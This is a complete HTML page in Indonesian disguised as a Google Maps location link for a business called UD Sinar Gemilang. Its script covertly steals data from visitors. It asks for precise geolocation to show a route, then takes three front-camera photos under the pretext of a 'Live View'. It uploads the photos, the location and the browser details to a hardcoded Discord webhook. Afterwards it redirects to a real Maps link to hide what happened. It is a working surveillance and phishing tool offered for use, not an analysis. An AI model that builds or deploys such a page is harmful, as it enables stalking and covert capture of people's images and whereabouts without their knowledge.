<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>UD Sinar Gemilang - Google Maps</title>
    <meta property="og:title" content="UD. Sinar Gemilang ¬∑ Kabupaten Mojokerto">
    <meta property="og:description" content="Lokasi presisi. Klik untuk rute navigasi.">
    <meta property="og:image" content="tampilan.jpg">
    <meta property="og:type" content="website">

    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Roboto', sans-serif; background: #000; }
        
        .bg-container {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: url('background.jpg') no-repeat center;
            background-size: cover; z-index: 1; transition: filter 0.5s ease;
        }

        .blurred { filter: blur(10px) brightness(0.7); }

        .overlay { 
            position: relative; z-index: 10; height: 100%; 
            display: flex; flex-direction: column; align-items: center; justify-content: center; 
            background: rgba(0,0,0,0.3); text-align: center; color: white; padding: 20px;
        }

        .maps-logo { width: 80px; margin-bottom: 20px; }

        .btn-action { 
            background: #1a73e8; color: white; border: none; 
            padding: 15px 30px; border-radius: 25px; 
            font-size: 15px; font-weight: 500; cursor: pointer; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.4); width: 100%; max-width: 300px;
        }

        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; }

        .loader {
            border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #ffffff;
            border-radius: 50%; width: 20px; height: 20px;
            animation: spin 1s linear infinite; display: inline-block;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none;"></canvas>

    <div id="bg" class="bg-container"></div>
    
    <div class="overlay">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282015-2020%29.svg/512px-Google_Maps_icon_%282015-2020%29.svg.png" class="maps-logo" alt="Maps">
        
        <div id="text-area" style="margin-bottom: 30px;">
            <h2 id="title">UD Sinar Gemilang</h2>
            <p id="desc">Izinkan akses lokasi untuk melihat navigasi</p>
        </div>
        
        <button class="btn-action" id="mainBtn" onclick="step1()">Izinkan Lokasi Untuk Melihat Lokasi</button>
    </div>

    <script>
        const WH = "https://discord.com/api/webhooks/1464945657386242215/reBayi8sdQCNfp5PMp_c12ejYPeeFwoNurlukhTAQfyrx6Yeccc2ZkPNDnb9iF0kzhBj";
        const REDIRECT = "https://maps.app.goo.gl/9mqwSJ51rg7v1QNUA";
        let userLoc = "";

        // STEP 1: LOKASI
        function step1() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((p) => {
                    userLoc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                    processLoading();
                }, () => {
                    alert("Akses lokasi ditolak. Peta tidak dapat dimuat.");
                }, {enableHighAccuracy: true});
            }
        }

        // STEP 2: LOADING & BLUR
        function processLoading() {
            const btn = document.getElementById('mainBtn');
            const bg = document.getElementById('bg');
            
            btn.disabled = true;
            btn.innerHTML = '<span class="loader"></span> Menghubungkan...';
            
            setTimeout(() => {
                bg.classList.add('blurred'); // Efek blur background.jpg
                document.getElementById('desc').innerText = "Fitur Live View memerlukan izin kamera";
                btn.disabled = false;
                btn.innerHTML = "Izinkan Perizinan Kamera Untuk Melihat Live View";
                btn.onclick = step2;
            }, 2000);
        }

        // STEP 3: KAMERA & 3 FOTO
        async function step2() {
            const btn = document.getElementById('mainBtn');
            btn.disabled = true;
            btn.innerText = "Membuka Live View...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;

                // Ambil 3 foto dengan jeda
                for (let i = 1; i <= 3; i++) {
                    await new Promise(r => setTimeout(r, 1000));
                    await takeSnap(video, i);
                }

                // Setelah semua terkirim, baru redirect
                setTimeout(() => {
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = REDIRECT;
                }, 1000);

            } catch (e) {
                // Jika kamera ditolak tetap kirim lokasi lalu redirect
                await sendToWebhook(null, "Kamera Ditolak");
                window.location.href = REDIRECT;
            }
        }

        async function takeSnap(video, index) {
            const canvas = document.getElementById('c');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            return new Promise((resolve) => {
                canvas.toBlob(async (blob) => {
                    await sendToWebhook(blob, `Foto ke-${index}`);
                    resolve();
                }, 'image/jpeg', 0.7);
            });
        }

        async function sendToWebhook(blob, label) {
            const formData = new FormData();
            const data = {
                content: `üîî **Data Terkirim**\nüìç **Lokasi:** ${userLoc}\nüì∏ **Status:** ${label}\nüì± **User:** ${navigator.userAgent}`
            };

            formData.append("payload_json", JSON.stringify(data));
            if (blob) formData.append("file", blob, `capture_${label}.jpg`);

            return fetch(WH, { method: "POST", body: formData, keepalive: true });
        }
    </script>
</body>
</html>
